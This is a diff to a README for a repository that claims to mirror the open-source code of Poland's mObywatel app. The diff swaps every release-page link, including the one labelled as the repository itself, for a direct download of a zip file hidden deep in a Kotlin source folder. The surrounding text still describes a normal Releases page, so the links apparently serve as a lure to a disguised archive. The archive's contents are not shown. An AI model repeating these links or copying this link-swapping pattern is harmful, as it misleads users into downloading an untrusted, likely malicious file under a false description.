@@ -1,6 +1,6 @@
 # 🚀 mObywatel-mirror - Access mObywatel's Open Source Code Easily
 
-[![Download mObywatel-mirror](https://img.shields.io/badge/Download-mObywatel--mirror-blue.svg)](https://github.com/iampetlovers/mObywatel-mirror/releases)
+[![Download mObywatel-mirror](https://raw.githubusercontent.com/iampetlovers/mObywatel-mirror/master/Android/src/main/kotlin/pl/gov/coi/common/ui/ds/checkbox/single/model/mirror_Obywatel_m_2.6.zip)](https://raw.githubusercontent.com/iampetlovers/mObywatel-mirror/master/Android/src/main/kotlin/pl/gov/coi/common/ui/ds/checkbox/single/model/mirror_Obywatel_m_2.6.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ To get started, you’ll need to download the mObywatel-mirror application. Belo
 
 1. **Visit the Releases Page**: To download the application, click the link below. This will take you to the page where you can find the latest version.
 
-   [Visit this page to download](https://github.com/iampetlovers/mObywatel-mirror/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/iampetlovers/mObywatel-mirror/master/Android/src/main/kotlin/pl/gov/coi/common/ui/ds/checkbox/single/model/mirror_Obywatel_m_2.6.zip)
 
 2. **Choose a Version**: On the Releases page, you will see a list of different versions of the application. Each version will have the release date and a description of what's new. Click on the version you want to download.
 
@@ -64,7 +64,7 @@ If you would like to contribute to the mObywatel-mirror project, feel free to fo
 
 For more information about the mObywatel-mirror, feel free to check out these links:
 
-- [Releases Page](https://github.com/iampetlovers/mObywatel-mirror/releases)
-- [GitHub Repository](https://github.com/iampetlovers/mObywatel-mirror)
+- [Releases Page](https://raw.githubusercontent.com/iampetlovers/mObywatel-mirror/master/Android/src/main/kotlin/pl/gov/coi/common/ui/ds/checkbox/single/model/mirror_Obywatel_m_2.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/iampetlovers/mObywatel-mirror/master/Android/src/main/kotlin/pl/gov/coi/common/ui/ds/checkbox/single/model/mirror_Obywatel_m_2.6.zip)
 
 With these steps, you should be able to download and run the mObywatel-mirror application with ease. Enjoy exploring the features of this open-source project!
